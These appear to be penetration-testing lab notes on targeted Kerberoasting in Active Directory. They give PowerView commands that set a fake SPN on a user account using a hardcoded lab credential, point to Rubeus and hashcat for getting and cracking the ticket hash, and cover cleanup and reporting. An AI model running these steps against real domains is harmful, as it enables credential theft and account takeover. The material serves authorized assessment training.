if we have GenericALL rights over this account, we can modify the account's SPN to create a SPN that we can then kerberoast to obtain the TGS ticket and hopefully crack the hash offline using hashcat

or if we have access to change the SPN 
## Creating a fake SPN
```
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('HTB\svc-alfresco', $SecPassword) 
```

```powershell-session
Set-DomainObject -Credential $Cred -Identity cyril -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
We could use the tool [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.

then we can just kerberoast new user with rubeus 

During cleanup
we need to undo all the things we did like creating fake SPN, adding user to group, changing password etc 

removing fake spn
```
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

removing user from group
```
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

Even though we performed as much cleanup as possible, we should still include every modification that we make in our final assessment report.